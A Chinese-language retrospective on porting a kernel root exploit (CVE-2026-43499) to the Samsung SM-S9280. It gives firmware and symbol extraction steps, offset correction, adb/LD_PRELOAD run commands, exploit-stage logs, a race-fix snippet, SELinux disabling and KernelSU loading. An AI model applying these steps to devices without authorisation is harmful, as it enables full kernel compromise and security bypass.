# S9280 免解锁 Root 适配流程（完整复盘）

> 本文是 SM-S9280（国行 DZF2）适配 CVE-2026-43499 的完整方法论复盘。
> 目标读者：想把这套方案移植到其他设备/固件的学习者。
> 所有命令均来自本次实际过程。

---

## 总览：适配 = 信息收集 → 定标 → 验证 → 排坑

```
阶段0 情报    确定目标/参考/固件，评估可行性
阶段1 提取    固件 → boot → 内核 → 恢复符号 ELF
阶段2 定标    与参考目标逐符号对比，生成 target.h
阶段3 验证    设备上逐阶段跑通 exploit 链路
阶段4 排坑    处理设备特有的环境问题
阶段5 集成    root 持久化 + KernelSU
阶段6 封装    App 化
```

---

## 阶段 0：情报收集

**目标信息**（决定整个方案是否可行）：
- 机型/固件：SM-S9280 CHC，S9280ZCS6DZF2，内核 `6.1.145-android14-11-3254743`
- 平台代号：e3q（S24 全系共享，Snapdragon 8 Gen 3）

**找参考**（省掉从零逆向的 80% 工作量）：
- 同平台（e3q）的 S928U1 DZF2 已有验证成功的 exploit（RMG 工程）
- 拿到参考工程后，适配工作变成"**对比差异、修正常量**"

**评估要点**：
- 漏洞利用基于 GKI 6.1 内核，同代固件（DZF2/DZE2）构建号接近 → 符号差异小
- 不同构建号（33419968 vs 3254743）→ 个别符号偏移会变，必须逐符号验证

---

## 阶段 1：固件与内核提取

### 1.1 下载固件（samloader）

```sh
# SAMFW 四件套：AP / BL / CP / CSC
python samloader download -m SM-S9280 -r CHC -v S9280ZCS6DZF2 -t 固件目录
```

### 1.2 提取 boot 与内核

```sh
# 从 AP 固件（约 9GB）中解出 boot 分区
# AP 是 LZ4 tar 包，需按条目偏移提取（本地脚本 repack_kernel.sh 有实现）

# 解压 boot 分区
lz4 -d boot_dzf2.img.lz4 boot_dzf2.img        # 22MB → 100MB
# 用 magiskboot 拆 boot（得到 kernel + ramdisk）
tools/magiskboot unpack boot_dzf2.img
# 内核本身可能还是 LZ4 压缩的
tools/magiskboot decompress kernel kernel_dzf2_raw   # → 38MB 原始内核
```

### 1.3 恢复带符号的 ELF（关键步骤）

原始内核是压缩的 zImage，没有 ELF 结构。用 **vmlinux-to-elf**（
GitHub 项目）从原始内核字节恢复可反汇编、带符号名的 ELF：

```sh
python3 vmlinux-to-elf/vmlinux-to-elf kernel_dzf2_raw vmlinux_dzf2.elf
```

产出：43MB ELF，符号名可用 `llvm-nm`、反汇编可用 `llvm-objdump`。

**为什么这步重要**：后续所有偏移（kmalloc_caches、workqueue、selinux 等）都从
这个 ELF 里定位和验证，它是整个适配的"真相源"。

---

## 阶段 2：定标——逐符号对比生成 target.h

### 2.1 从 ELF 定位关键符号

```sh
llvm-nm vmlinux_dzf2.elf | grep -E "kmalloc_caches|init_task|pipe_fcntl"
# ffffffc00976cbb8 D kmalloc_caches
# ffffffc00a24f8c0 d init_task
# ffffffc0083b1e18 t pipe_fcntl
```

### 2.2 与参考（S928U1 target.h）对比

参考工程 `fusion-s24u/src/targets/e3q-S928USQS6DZF2/target.h` 已含全套常量。
逐一对比 17 个关键符号：

```
P0 阶段符号：16/17 完全一致（phys_offset、kernel_phys_load、init_task、root_tg...）
唯一差异：kmalloc_caches
  S928U1: 0x176c6f8
  S9280:  0x176cbb8   ← 必须修正
```

### 2.3 生成 S9280 target.h

复制参考 target.h → 改 `kmalloc_caches` 偏移 → 建 `e3q-S9280ZCS6DZF2/` 目标目录。

> 教训：市面上"通用工具"直接套美版偏移，导致国行 16/16 全失败在内存准备阶段。
> **永远以自己设备 ELF 里反查的符号为准**。

### 2.4 生成 KASLR 滑动指纹

```sh
perl generate_p0_fingerprint.pl kernel_dzf2_raw 0x1f0000 p0_fingerprint_dzf2.h
# 32 行 × 8 qword，设备实测 32/32 命中
```

---

## 阶段 3：构建 payload 并逐阶段验证

### 3.1 构建

```sh
cd fusion-s24u
ANDROID_NDK_HOME=.../android-ndk-r29 TARGET=e3q-S9280ZCS6DZF2 make stable
# 产出 cve-2026-43499-app.stable.so（104128B，大小受限）
```

### 3.2 设备运行方式（LD_PRELOAD 技巧）

```sh
adb shell 'cd /data/local/tmp && \
  EXPLOIT_ATTEMPTS=24 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 \
  CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499 \
  /system/bin/sh -c true'
```

- `LD_PRELOAD` 让 exploit 在 sh 启动时以构造器方式运行（uid 2000 shell 域，SELinux 宽松）
- 24 次尝试，每次失败自动重试

### 3.3 日志阶段地图（验证到哪一步）

```
[+] slide-kaslr-ok          ← KASLR 滑动恢复 ✓（指纹 32/32 后必过）
[*] fresh physrw pipe page  ← 管道内存准备 ✓
[*] mmm leaked=... object_index=N   ← mm_struct 泄漏 ✓（bank 布局）
[*] sk_buff reclaim sends=16/16     ← SKB 回收 ✓
[*] kernel page prepare ...         ← 可控内核页 ✓
[*] app fops slide route ...        ← fops 路由（概率性触发）
[*] stage=verifying-kernel-access   ← CFI 验证 ✓
[*] cfi write/read ret=35           ← 任意读写 ✓
[*] pipe caches ... selected=...    ← kmalloc 缓存定位 ✓
[*] phys step pipe probe found=1    ← pipe_buffer 定位 ✓
[*] root direct start uid=2000      ← root 阶段开始
[*] root umh queued ...             ← work 注入 workqueue
[*] root umh result ... socket=1    ← ★ root 成功
[+] exploit completed
```

**概率性说明**：`app fops slide attempt triggered=0/1` 是竞态触发，有概率失败；
S928U1 官方验证也是"第 2 轮 attempt 4/24 才成功"。

---

## 阶段 4：排坑记录（本项目的核心价值）

### 坑 1：F_SETPIPE_SZ EPERM —— 配额污染

**现象**：exploit 准备管道时 `F_SETPIPE_SZ 128KB → EPERM`，24 次全失败。

**排查过程**：
1. 怀疑 Samsung 内核改过限制 → 反汇编 `pipe_fcntl` 逐条核对
   ```sh
   llvm-objdump -d --start-address=0xffffffc0083b1e18 --stop-address=0xffffffc0083b2000 vmlinux_dzf2.elf
   ```
   结论：**完全标准逻辑**（soft=16384 页、max=1MB、无补丁）
2. 写 `pipe_test` 在设备上压测：单个管道 256 slots 正常，但累计 261 个 32-slot
   管道就 EPERM —— 与 16384 页配额对不上（应能到 512 个）
3. 反推：配额里已有 ~7700 页被占用 → 查 uid 2000 进程
   ```sh
   for p in /proc/[0-9]*; do [ "$(stat -c %u $p)" = 2000 ] && echo "$p $(ls $p/fd | wc -l)"; done
   ```
4. **找到元凶**：残留的 `cve43499-hold` 进程握着 480 个已扩容管道（exploit 的
   keeper 子进程，父进程死亡后未清理）→ kill 后压力测试 400/400 通过

**通用教训**：exploit 环境被前次失败"污染"时，先查同 uid 残留进程，再怀疑内核。

### 坑 2：worklist 竞态 —— 孤儿 work 定时炸弹

**现象**：root 阶段 `root umh queued` 后手机几分钟内随机 panic 重启；
有时 exploit 已成功（root 拿到了）仍逃不过。

**取证**（关键技能：读 last_kmsg）：
```sh
adb shell cat /proc/last_kmsg   # 上次崩溃的内核日志（system:log 可读）
```
崩溃回溯：
```
list_del corruption. next->prev should be ..., but was ...
kernel BUG at lib/list_debug.c:64!
__list_del_entry_valid ← try_to_grab_pending ← __cancel_work_timer
← cancel_work_sync ← dsi_ctrl_transfer_prepare [msm_drm]   ← 显示驱动!
```

**根因**：exploit 把伪造 work 注入 `system_unbound` 池 worklist 时，如果显示驱动
（DSI，用同一池）恰好并发入队真实 work，exploit 对链表头的覆盖把真实 work 变
成"孤儿"（PENDING 但脱离链表）→ 下次 cancel 它时 `__list_del_entry_valid` 直接
BUG。屏幕亮着 = 显示驱动活跃 = 必中。

**修复**：注入前**立即重查 worklist 仍为空**；若期间被真实 work 占用则回滚
计数器、放弃本attempt：
```c
uint64_t re_next = root_read64(fd, worklist);
uint64_t re_prev = root_read64(fd, worklist + sizeof(uint64_t));
if (re_next != worklist || re_prev != worklist) {
    // 回滚 inflight/nr_active/refcnt，return 0
}
```
配合"运行期间熄屏"（显示驱动静默），崩溃源基本消除。

**通用教训**：任何"往共享内核结构里注入"的操作，先确认它空闲、注入前重查、
失败要回滚——竞态窗口从 10 次 physrw 缩短到 2 次。

### 坑 3：SELinux 状态反复

- exploit 的 selinux 写入（置 0）在 root 阶段生效 → 设备 Permissive
- ksud late-load 成功后**恢复 Enforcing**（KernelSU 默认行为）→ su socket 断开
- 这不是故障：之后 root 由 KernelSU Manager 管理

### 坑 4：模块选型

- 普通 GKI `android14-6.1_kernelsu.ko` 在国行可加载（version 32525，ioctl 验证通过）
- RMG 参考用 **kdp 补丁**变体（绕过 Samsung KDP/RKP/DEFEX）；国行当前普通版
  稳定，kdp 作为备选（需按本机 vermagic 重新构建）

---

## 阶段 5：root 持久化与 KernelSU

### su_daemon 架构（root helper 就是 su 守护进程 + 客户端双模式）

```
--umh <uid>   ← 由 UMH 以 root 启动，监听 /data/local/tmp/temp_su.sock
                （校验 SO_PEERCRED uid，仅允许 shell 连接）
客户端模式     ← 连接 socket → 以 root fork 执行命令
  --late-load  ← 特殊命令：unshare + bind mount ksud 到 logcat + exec
                 ksud late-load --ephemeral → 加载 kernelsu.ko → ioctl 验证
```

**关键坑**：不能直接用 shell 跑 `ksud late-load`（非 root，rename /data/adb 失败）。
必须**经守护进程**：`cve-2026-43499-root --late-load`。

### Manager 验证

- 装 KernelSU Manager v3.2.5（versionCode 32525 与驱动匹配）
- 首次打开可能显示"未安装" → **强制停止后重开** → "工作中 \<LKM\> [越狱模式]"

---

## 阶段 6：App 封装

- Shizuku 提供 shell 域执行能力
- assets 内置：payload(.so) / root helper / ksud
- 日志轮询：500ms 读进程输出，增量追加（半行合并），打 stage 标记
- 结束判定：`exploit completed` + `retval=0 socket=1` / `done=1 root=1`

---

## 附：可复用的调试命令

```sh
# 符号定位
llvm-nm vmlinux_dzf2.elf | grep <symbol>

# 反汇编验证内核逻辑（确认有无厂商补丁）
llvm-objdump -d --start-address=<addr> --stop-address=<addr> vmlinux_dzf2.elf

# 读上次崩溃日志
adb shell cat /proc/last_kmsg

# KernelSU 驱动探测（reboot-magic ioctl）
adb push ksu_test /data/local/tmp && adb shell /data/local/tmp/ksu_test

# UI 自动化取界面文本（无 root 也能用）
adb shell uiautomator dump /data/local/tmp/ui.xml && cat /data/local/tmp/ui.xml
```

## 结语

把"已验证的参考 exploit"移植到新固件，本质是**符号定标 + 设备环境排坑**。
符号定标靠 vmlinux-to-elf + 逐项对比；环境排坑靠"先取证（last_kmsg/压测）、
再定位（残留进程/并发对象）、后修复（重查/回滚）"。这两件事做扎实，
剩下的就是按日志阶段地图把链路走通。

---

> 返回 [文档中心](README.md) · [根 README](../README.md)
